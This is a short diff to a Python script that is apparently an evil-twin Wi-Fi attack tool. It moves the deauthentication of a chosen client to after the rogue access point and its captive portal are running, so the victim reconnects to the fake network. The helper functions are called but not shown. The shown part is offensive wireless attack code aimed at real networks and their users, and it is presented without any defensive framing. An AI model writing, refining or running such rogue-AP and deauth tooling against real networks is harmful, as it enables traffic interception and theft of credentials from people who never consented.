@@ -70,13 +70,14 @@ def main():
                 print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
                 print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
 
-                # Perform attack
+                # Start the attack
                 attack.create_evil_ap(ap_info, iface)
-                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
 
                 # Launch captive portal in background
                 portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
                 portal_thread.start()
+
+                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
 
                 # Stop packet sniffing (we don't need it now)
                 scan.stop_sniff.set()
